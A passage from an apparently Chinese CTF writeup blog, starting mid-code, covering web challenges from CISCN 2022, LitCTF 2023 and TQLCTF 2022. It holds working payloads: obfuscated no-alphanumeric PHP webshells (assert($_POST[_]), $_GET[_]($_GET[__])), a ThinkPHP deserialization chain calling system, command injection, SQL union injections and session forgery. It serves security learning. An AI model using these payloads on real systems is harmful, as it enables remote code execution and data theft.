剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;;function mb_str_split( $string ) &#123;    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string ); &#125;foreach (mb_str_split($word) as $c)&#123;    $arr[] = $c;&#125;for ($x=0;$x&lt;strlen($shell);$x++)&#123;    for ($y=0;$y&lt;count($arr);$y++)    &#123;        $k = $arr[$y];        if ($shell[$x] == ~($k&#123;1&#125;))        &#123;            $result .= $k;            break;        &#125;    &#125;&#125;echo $result;\n\n这个取反是有点难度的，我们仔细看看\n\n$shell = &quot;assert&quot;;$result = &quot;&quot;;$arr =array();$word\n\n这几个可以当变量，$word太长了我不写了看起来不舒服\nfunction mb_str_split( $string ) &#123;    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string ); &#125;foreach (mb_str_split($word) as $c)&#123;    $arr[] = $c;&#125;\n\n这两个我们放一块看看，前者是一个函数，是一个回溯匹配。其实我是看不懂的，只能看到前半部分有^这个是开头我知道，后者有$是结尾。感觉是对开头结尾进行的操作\n看看chatgpt怎么说\n(?&lt;!^): 这是一个负向回溯断言，用于匹配不在字符串开头的位置。其中 (?&lt;!...) 表示负向回溯断言，^ 表示字符串的开头。因此 (?&lt;!^) 就是匹配不在字符串开头的位置。这个断言的作用是确保只有在两个字符之间的位置才能进行分割。\n(?!$): 这是一个负向预测断言，用于匹配不在字符串结尾的位置。其中 (?!...) 表示负向预测断言，$ 表示字符串的结尾。因此 (?!$) 就是匹配不在字符串结尾的位置。这个断言的作用是确保只有在两个字符之间的位置才能进行分割。\n大概是能理解了\n后面就是对我们的$word的这个字符库进行遍历，赋值给数组。\n为什么后面就知道了\nfor ($x=0;$x&lt;strlen($shell);$x++)&#123;    for ($y=0;$y&lt;count($arr);$y++)    &#123;        $k = $arr[$y];        if ($shell[$x] == ~($k&#123;1&#125;))        &#123;            $result .= $k;            break;        &#125;    &#125;&#125;echo $result;\n\n这里对我们的$shell进行遍历循环，其实思路都是一样的。匹配相等的。我们对\n$shell[$x] &#x3D;&#x3D; ~($k{1})这个进行判断。\n就可以了\n最后出来的结果\n\n还记得之前我们学习的取反知识点吗？\n一个字符可以分成三个字节。\n&lt;?php$_++;   //得到1，此时$_=1$__ = &quot;极&quot;;$___ = ~($__&#123;$_&#125;);   //得到a，此时$___=&quot;a&quot;$__ = &quot;区&quot;;$___ .= ~($__&#123;$_&#125;);   //得到s，此时$___=&quot;as&quot;$___ .= ~($__&#123;$_&#125;);   //此时$___=&quot;ass&quot;$__ = &quot;皮&quot;;$___ .= ~($__&#123;$_&#125;);   //得到e，此时$___=&quot;asse&quot;$__ = &quot;十&quot;;$___ .= ~($__&#123;$_&#125;);   //得到r，此时$___=&quot;asser&quot;$__ = &quot;勺&quot;;$___ .= ~($__&#123;$_&#125;);   //得到t，此时$___=&quot;assert&quot;$____ = &#x27;_&#x27;;   //$____=&#x27;_&#x27;$__ = &quot;寸&quot;;$____ .= ~($__&#123;$_&#125;);   //得到P，此时$____=&quot;_P&quot;$__ = &quot;小&quot;;$____ .= ~($__&#123;$_&#125;);   //得到O，此时$____=&quot;_PO&quot;$__ = &quot;欠&quot;;$____ .= ~($__&#123;$_&#125;);   //得到S，此时$____=&quot;_POS&quot;$__ = &quot;立&quot;;$____ .= ~($__&#123;$_&#125;);   //得到T，此时$____=&quot;_POST&quot;$_ = $$____;   //$_ = $_POST$___($_[_]);   //assert($_POST[_])\n\n\n大概需要理解这个思路和操作\n一个plusdef get(shell):    hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))    hexbit = hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)    print(hexbit)get(&#x27;assert&#x27;)get(&#x27;_POST&#x27;)\n\n首先，map() 函数将传入的 lambda 匿名函数应用到 shell 字符串中的每个字符上。lambda 函数接受一个字符参数 x，并执行以下操作：\n\nord(x)：将字符 x 转换为其对应的 ASCII 码值。\n-(256-ord(x))：将 ASCII 码值减去 256，得到一个负整数。\n~(-(256-ord(x)))：将该负整数按位取反，得到其补码表示的正整数。\nhex(~(-(256-ord(x))))：将该正整数转换为十六进制字符串表示。\n\n因此，map() 函数返回一个字符串列表，其中每个字符串表示 shell 字符串中的一个字符的 URL 编码的十六进制字符串。\n接着，&#39;&#39;.join() 函数将该字符串列表中的所有字符串连接起来，生成一个整个字符串的 URL 编码的十六进制字符串。\n最后，将该字符串中的所有 ‘0x’ 替换为 ‘%’，得到最终的 URL 编码字符串。\n&lt;?php$_ = ~&quot;%9e%8c%8c%9a%8d%8b&quot;;   //得到assert，此时$_=&quot;assert&quot;$__ = ~&quot;%a0%af%b0%ac%ab&quot;;   //得到_POST，此时$__=&quot;_POST&quot;$___ = $$__;   //$___=$_POST$_($___[_]);   //assert($_POST[_])\n\n自增自减&quot;A&quot;++ ==&gt; &quot;B&quot;&quot;B&quot;++ ==&gt; &quot;C&quot;\n\n这个能理解吧\n一个很简单的思想，能得到一个字符，所有字符都可以通过自增自减得到\n根据上面的知识总结，我们看看这道题怎么写\n\n重新看看题目\n测试一下那些字符可以使用\n\n&lt;?phpfor($i=32;$i&lt;127;$i++)&#123;    if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, chr($i))) &#123;        echo chr($i);    &#125;&#125;\n\n可用字符有这些\n$()+,.0123456789;=[]_&#123;&#125;\n\n这里可以有字符我们就利用自增方式来玩\n&lt;?php$__=_.[];   //$__=_Array$_=$__[4];  //$_=a$_++;   //$_=b$_0=++$_;   //$_0=$_=c$_++;   //$_=d$_++;   //$_=e$_++;   //$_=f$_++;   //$_=g$_=$_0.++$_.$__[3];     //$_0=c;++$_=h;$__[3]=r$_=_.$_(71).$_(69).$_(84);  //$_=_.G.E.T=_GET$$_[_]($$_[__]);    //$_GET[_]($_GET[__])?&gt;\n\n$__=_.[];$_=$__[4];$_++;$_0=++$_;$_++;$_++;$_++;$_++;$_=$_0.++$_.$__[3];$_=_.$_(71).$_(69).$_(84);$$_[_]($$_[__]);\n\n注意还有最后一点\npost传参时需要将payload进行urlencode\nget传参 ?_=system&amp;__=ls /\nok\n思路是这样的但是这个payload我不知道为什么不可以\n换一个\n$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);GET?1=system&amp;2=lsPOSTrce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B\n\n\n","categories":["writeups"],"tags":["文件包含","html","无字符rce","文件上传","cookie"]},{"title":"CISCN2022初赛","url":"/2023/05/08/CISCN2022%E5%88%9D%E8%B5%9B/","content":"[CISCN 2022 初赛]ezpop扫描出了www.zip\n然后有了thinkphp的框架目录\n然后题目告诉我们thinkphp的版本直接找网上的poc\nhttps://xz.aliyun.com/t/11584\n&lt;?php// 保证命名空间的一致namespace think &#123;    // Model需要是抽象类    abstract class Model &#123;        // 需要用到的关键字        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        // 初始化        public function __construct($obj=&#x27;&#x27;) &#123;            $this-&gt;lazySave = true;            $this-&gt;data = [&#x27;whoami&#x27;=&gt;[&#x27;whoami&#x27;]];//这里修改一下为 ls /*            $this-&gt;exists = true;            $this-&gt;table = $obj;    // 触发__toString            $this-&gt;withAttr = [&#x27;whoami&#x27;=&gt;[&#x27;system&#x27;]];            $this-&gt;json = [&#x27;whoami&#x27;];            $this-&gt;jsonAssoc = true;        &#125;    &#125;&#125;namespace think\\model &#123;    use think\\Model;    class Pivot extends Model &#123;    &#125;    // 实例化    $p = new Pivot(new Pivot());    echo urlencode(serialize($p));&#125;\n\n\n\n\n[CISCN 2022 华东南]web1无环境，写屁\n[CISCN 2022 华东南]xxcloud写不出\n罢了复现不了\n","categories":["writeups"],"tags":["反序列化","thinkphp"]},{"title":"LitCTF-2023","url":"/2023/05/15/LitCTF-2023/","content":"前言LitCTF 2023因为过生日就没有打，这里复现一下，希望不会太过于简单\n[LitCTF 2023]导弹迷踪\n一张图解决\n[LitCTF 2023]Ping这里的过滤是在前端\n\n一句话前端过滤等于没有过滤\n方法一f12加f1禁用javascript\n就可以随便ping 了\n127.0.0.1 | cat &#x2F;flag\n\n方法二\n抓包可以直接绕过前端\n[LitCTF 2023]我Flag呢？\n[LitCTF 2023]1zjs\njs里面有个提示\n\n控制台里面跑一下\n\n结束\n[LitCTF 2023]PHP是世界上最好的语言！！\n没有什么意思\n[LitCTF 2023]Follow me and hack me\n[LitCTF 2023]Vim yydsVim源码泄露\n说明可能存在.swp备份文件，正常URL:xxx&#x2F;index.php则尝试URL:xxx&#x2F;.index.php.swp下载.swp文件代码并使用vim打开，打开命令：vim -r index.php.swp打开后则发现源码，进行代码审计\n\n传参就可以了\n\n[LitCTF 2023]Http pro max plus这题有点意思\n\n一眼xff开始抓包\n\n离谱\n\n换一种 client-ip: 127.0.0.1\n\nreferer\n\n换浏览器\n\n代理\nvia: Clash.win\n\n\nok\n\n也没有flag\n\n\n结束\n[LitCTF 2023]Flag点击就送！伪造session\n\n看看cookie\n\n这里是一个没怎么接触过的知识点，flask的session伪造\nhttps://www.freebuf.com/articles/web/354448.html\n这里有工具可以直接利用\nhttps://github.com/noraj/flask-session-cookie-manager\n原理就是flask框架的session放在客户端，是可以被我们读取的，这里我们需要知道他的secrt——key就可以伪造\n\n这里猜测密码是LitCTF\n\n改session\nok\n[LitCTF 2023]作业管理系统题目环境好像坏了\n[LitCTF 2023]这是什么？SQL ！注一下 ！sql注入\n不断测试\n‘1’))))))这样闭合是合理的\n用#不能用–+\n&#x27;1&#x27;)))))) union select 1,2#&#x27;1&#x27;)))))) union select 1,database()#\n\n\n数据库名\n&#x27;1&#x27;)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;#\n\n\n&#x27;1&#x27;)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#\n\n\n一般在password里面\n1)))))) union select 1,group_concat(password) from ctf.users#\n\n\n感觉被耍了\n\n用sqlmap还跑出来一个数据库\n&#x27;1&#x27;)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;#\n\n\n1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_name=&quot;flag&quot;#\n\n\n一样的\n1)))))) union select 1,group_concat(flag) from ctftraining.flag#\n\n\ntmd\n[LitCTF 2023]就当无事发生\n怪怪的查询github历史\n[LitCTF 2023]彩蛋不写了\n\n","categories":["writeups"],"tags":["文件上传","JS","RCE","前端绕过","jsfuck","信息泄露","flask","git"]},{"title":"TQLCTF2022","url":"/2023/05/16/TQLCTF2022/","content":"前言这个比赛应该很有难度，估计得是完完全全看着wp写，里面的nodejs和DNS污染我是都没有接触过的，试试吧，一起学习一下\n[TQLCTF 2022]simple_bypass这题难度就可见一斑，连入口都没有找到。\n用view-source看源码\n\n这里要敏锐的发现一个文件包含漏洞。\n利用这个读取敏感文件，比如index.php\n\n出来了\n&lt;?phperror_reporting(0);if(isset($_POST[&#x27;user&#x27;]) &amp;&amp; isset($_POST[&#x27;pass&#x27;]))&#123;\t$hash_user = md5($_POST[&#x27;user&#x27;]);\t$hash_pass = &#x27;zsf&#x27;.md5($_POST[&#x27;pass&#x27;]);\tif(isset($_POST[&#x27;punctuation&#x27;]))&#123;\t\t//filter\t\tif (strlen($_POST[&#x27;user&#x27;]) &gt; 6)&#123;\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;);\t\t&#125;\t\telseif(strlen($_POST[&#x27;website&#x27;]) &gt; 25)&#123;\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;);\t\t&#125;\t\telseif(strlen($_POST[&#x27;punctuation&#x27;]) &gt; 1000)&#123;\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;);\t\t&#125;\t\telse&#123;\t\t\tif(preg_match(&#x27;/[^\\w\\/\\(\\)\\*&lt;&gt;]/&#x27;, $_POST[&#x27;user&#x27;]) === 0)&#123;\t\t\t\tif (preg_match(&#x27;/[^\\w\\/\\*:\\.\\;\\(\\)\\n&lt;&gt;]/&#x27;, $_POST[&#x27;website&#x27;]) === 0)&#123;\t\t\t\t\t$_POST[&#x27;punctuation&#x27;] = preg_replace(&quot;/[a-z,A-Z,0-9&gt;\\?]/&quot;,&quot;&quot;,$_POST[&#x27;punctuation&#x27;]);\t\t\t\t\t$template = file_get_contents(&#x27;./template.html&#x27;);\t\t\t\t\t$content = str_replace(&quot;__USER__&quot;, $_POST[&#x27;user&#x27;], $template);\t\t\t\t\t$content = str_replace(&quot;__PASS__&quot;, $hash_pass, $content);\t\t\t\t\t$content = str_replace(&quot;__WEBSITE__&quot;, $_POST[&#x27;website&#x27;], $content);\t\t\t\t\t$content = str_replace(&quot;__PUNC__&quot;, $_POST[&#x27;punctuation&#x27;], $content);\t\t\t\t\tfile_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);\t\t\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;);\t\t\t\t&#125;\t\t\t\telse&#123;\t\t\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;);\t\t\t\t&#125;\t\t\t&#125;\t\t\telse&#123;\t\t\t\techo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;);\t\t\t&#125;\t\t&#125;\t&#125;\telse&#123;\t\tsetcookie(&quot;user&quot;, $_POST[&#x27;user&#x27;], time()+3600);\t\tsetcookie(&quot;pass&quot;, $hash_pass, time()+3600);\t\tHeader(&quot;Location:sandbox/$hash_user.php&quot;);\t&#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; \t&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\t&lt;title&gt;Simple Linux&lt;/title&gt;\t&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/styles.css&quot;&gt;\t&lt;!--[if IE]&gt;\t\t&lt;script src=&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt;\t&lt;![endif]--&gt;&lt;/head&gt;&lt;body&gt;\t&lt;div class=&quot;jq22-container&quot; style=&quot;padding-top:100px&quot;&gt;\t\t&lt;div class=&quot;login-wrap&quot;&gt;\t\t\t&lt;div class=&quot;login-html&quot;&gt;\t\t\t\t&lt;input id=&quot;tab-1&quot; type=&quot;radio&quot; name=&quot;tab&quot; class=&quot;sign-in&quot; checked&gt;&lt;label for=&quot;tab-1&quot; class=&quot;tab&quot;&gt;Sign In&lt;/label&gt;\t\t\t\t&lt;input id=&quot;tab-2&quot; type=&quot;radio&quot; name=&quot;tab&quot; class=&quot;sign-up&quot;&gt;&lt;label for=&quot;tab-2&quot; class=&quot;tab&quot;&gt;Sign Up&lt;/label&gt;\t\t\t\t&lt;div class=&quot;login-form&quot;&gt;\t\t\t\t\t&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;\t\t\t\t\t\t&lt;div class=&quot;sign-in-htm&quot;&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;user&quot; name=&quot;user&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;pass&quot; type=&quot;password&quot; class=&quot;input&quot; data-type=&quot;password&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;!-- &lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;check&quot; type=&quot;checkbox&quot; class=&quot;check&quot; checked&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;check&quot;&gt;&lt;span class=&quot;icon&quot;&gt;&lt;/span&gt; Keep me Signed in&lt;/label&gt;\t\t\t\t\t\t\t&lt;/div&gt; --&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Sign In&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;hr&quot;&gt;&lt;/div&gt;\t\t\t\t\t\t\t&lt;!-- &lt;div class=&quot;foot-lnk&quot;&gt;\t\t\t\t\t\t\t\t&lt;a href=&quot;#forgot&quot;&gt;Forgot Password?&lt;/a&gt;\t\t\t\t\t\t\t&lt;/div&gt; --&gt;\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t&lt;/form&gt;\t\t\t\t\t&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;\t\t\t\t\t\t&lt;div class=&quot;sign-up-htm&quot;&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;user&quot; class=&quot;label&quot;&gt;Username&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;user&quot; name=&quot;user&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Password&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;pass&quot; type=&quot;password&quot; class=&quot;input&quot; data-type=&quot;password&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Website&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;website&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;pass&quot; class=&quot;label&quot;&gt;Your Punctuation&lt;/label&gt;\t\t\t\t\t\t\t\t&lt;input id=&quot;pass&quot; name=&quot;punctuation&quot; type=&quot;text&quot; class=&quot;input&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;group&quot;&gt;\t\t\t\t\t\t\t\t&lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Sign Up&quot;&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;hr&quot;&gt;&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=&quot;foot-lnk&quot;&gt;\t\t\t\t\t\t\t\t&lt;label for=&quot;tab-1&quot;&gt;Already Member?&lt;/a&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t&lt;/form&gt;\t\t\t\t&lt;/div&gt;\t\t\t&lt;/div&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;\t&lt;/body&gt;&lt;/html&gt;\n\n得到这样一段源码\n代码审计一下\n这里是登录界面的源代码\n没发现有什么特点。里面有一个template.html\n看看这么长的代码完全不想看，还是得看\n&lt;?php\t\t\terror_reporting(0);\t\t\t$user = ((string)__USER__);\t\t\t$pass = ((string)__PASS__);\t\t\t\t\t\tif(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user &amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;\t\t\t\techo($_COOKIE[&#x27;user&#x27;]);\t\t\t&#125;\t\t\telse&#123;\t\t\t\tdie(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);\t\t\t&#125;\t\t?&gt;\t\t&lt;/li&gt;      &lt;/ul&gt;      &lt;ul class=&quot;item&quot;&gt;        &lt;li&gt;&lt;span class=&quot;sitting_btn&quot;&gt;&lt;/span&gt;系统设置&lt;/li&gt;        &lt;li&gt;&lt;span class=&quot;help_btn&quot;&gt;&lt;/span&gt;使用指南 &lt;b&gt;&lt;/b&gt;&lt;/li&gt;        &lt;li&gt;&lt;span class=&quot;about_btn&quot;&gt;&lt;/span&gt;关于我们&lt;/li&gt;        &lt;li&gt;&lt;span class=&quot;logout_btn&quot;&gt;&lt;/span&gt;退出系统&lt;/li&gt;      &lt;/ul&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;&lt;a href=&quot;#&quot; class=&quot;powered_by&quot;&gt;__PUNC__&lt;/a&gt;&lt;ul id=&quot;deskIcon&quot;&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win5&quot; path=&quot;https://image.baidu.com/&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon4.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;图片      &lt;div class=&quot;right_cron&quot;&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/li&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win6&quot; path=&quot;http://www.4399.com/&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon5.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;游戏      &lt;div class=&quot;right_cron&quot;&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/li&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win10&quot; path=&quot;../get_pic.php?image=img/haokangde.png&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon4.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;&lt;b&gt;好康的&lt;/b&gt;      &lt;div class=&quot;right_cron&quot;&gt;&lt;/div&gt;    &lt;/div&gt;  &lt;/li&gt;  &lt;li class=&quot;desktop_icon&quot; id=&quot;win16&quot; path=&quot;__WEBSITE__&quot;&gt; &lt;span class=&quot;icon&quot;&gt;&lt;img src=&quot;../img/icon10.png&quot;/&gt;&lt;/span&gt;    &lt;div class=&quot;text&quot;&gt;&lt;b&gt;你的网站&lt;/b&gt;\n\n看看关键代码\n总结一下，漏洞点永远存在于输入\nuser，website，punctuation这几个，有长度去构造输入的就是punctuation\n\n\n包括过滤方面，也只有_PUNC_过滤的是最少的，只ban掉了字母和数字\n具体怎么输入，只要知道\n\n这里是用了替换的\n等于我们输入的就是会到这个template.html源码里面，emmmm有点乱，就是直接在注册框里面输入，我们就会给其赋值\n利用无字母rce\n这个是很简单的\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);\n\n这时候并不可以直接利用，因为代码执行不在php里面\n所以我们需要去注释\n最终的payload\nuser=1)/*&amp;pass=aa&amp;website=&amp;punctuation=*/;$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);/*\n\n用这个去注册，然后post传_&#x3D;system(命令);\n就可以了\n\n写的很乱，但是都讲到了\n[TQLCTF 2022]SQL TEST真的很烦，很多环境都是坏的\n[TQLCTF 2022]network tools\n这题给了几个工具，都用了一下，没有什么头绪\n\n查了一下，要先学几个前置知识，一个就是DNS\n\n我画了个图，这里就是DNS工作的主要流程，其实就是层层递归\nfrom flask import Flask, request, send_from_directory,sessionfrom flask_session import Sessionfrom io import BytesIOimport reimport osimport ftplibfrom hashlib import md5app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(32)app.config[&#x27;SESSION_TYPE&#x27;] = &#x27;filesystem&#x27;  sess = Session()sess.init_app(app)def exec_command(cmd, addr):    result = &#x27;&#x27;    if re.match(r&#x27;^[a-zA-Z0-9.:-]+$&#x27;, addr) != None:        with os.popen(cmd % (addr)) as readObj:            result = readObj.read()    else:        result = &#x27;Invalid Address!&#x27;    return result@app.route(&quot;/&quot;)def index():    if not session.get(&#x27;token&#x27;):        token = md5(os.urandom(32)).hexdigest()[:8]        session[&#x27;token&#x27;] = token    return send_from_directory(&#x27;&#x27;, &#x27;index.html&#x27;)@app.route(&quot;/ping&quot;, methods=[&#x27;POST&#x27;])def ping():    addr = request.form.get(&#x27;addr&#x27;, &#x27;&#x27;)    if addr == &#x27;&#x27;:        return &#x27;Parameter &quot;addr&quot; Empty!&#x27;    return exec_command(&quot;ping -c 3 -W 1 %s 2&gt;&amp;1&quot;, addr)@app.route(&quot;/traceroute&quot;, methods=[&#x27;POST&#x27;])def traceroute():    addr = request.form.get(&#x27;addr&#x27;, &#x27;&#x27;)    if addr == &#x27;&#x27;:        return &#x27;Parameter &quot;addr&quot; Empty!&#x27;    return exec_command(&quot;traceroute -q 1 -w 1 -n %s 2&gt;&amp;1&quot;, addr)@app.route(&quot;/ftpcheck&quot;)def ftpcheck():    if not session.get(&#x27;token&#x27;):        return redirect(&quot;/&quot;)    domain = session.get(&#x27;token&#x27;) + &quot;.ftp.testsweb.xyz&quot;    file = &#x27;robots.txt&#x27;    fp = BytesIO()    try:        with ftplib.FTP(domain) as ftp:            ftp.login(&quot;admin&quot;,&quot;admin&quot;)            ftp.retrbinary(&#x27;RETR &#x27; + file, fp.write)    except ftplib.all_errors as e:        return &#x27;FTP &#123;&#125; Check Error: &#123;&#125;&#x27;.format(domain,str(e))    fp.seek(0)    try:        with ftplib.FTP(domain) as ftp:            ftp.login(&quot;admin&quot;,&quot;admin&quot;)            ftp.storbinary(&#x27;STOR &#x27; + file, fp)    except ftplib.all_errors as e:        return &#x27;FTP &#123;&#125; Check Error: &#123;&#125;&#x27;.format(domain,str(e))    fp.close()    return &#x27;FTP &#123;&#125; Check Success.&#x27;.format(domain)@app.route(&quot;/shellcheck&quot;, methods=[&#x27;POST&#x27;])def shellcheck():    if request.remote_addr != &#x27;127.0.0.1&#x27;:        return &#x27;Localhost only&#x27;    shell = request.form.get(&#x27;shell&#x27;, &#x27;&#x27;)    if shell == &#x27;&#x27;:        return &#x27;Parameter &quot;shell&quot; Empty!&#x27;    return str(os.system(shell))if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)\n\n思路就出来了\n利用\n@app.route(“&#x2F;shellcheck”, 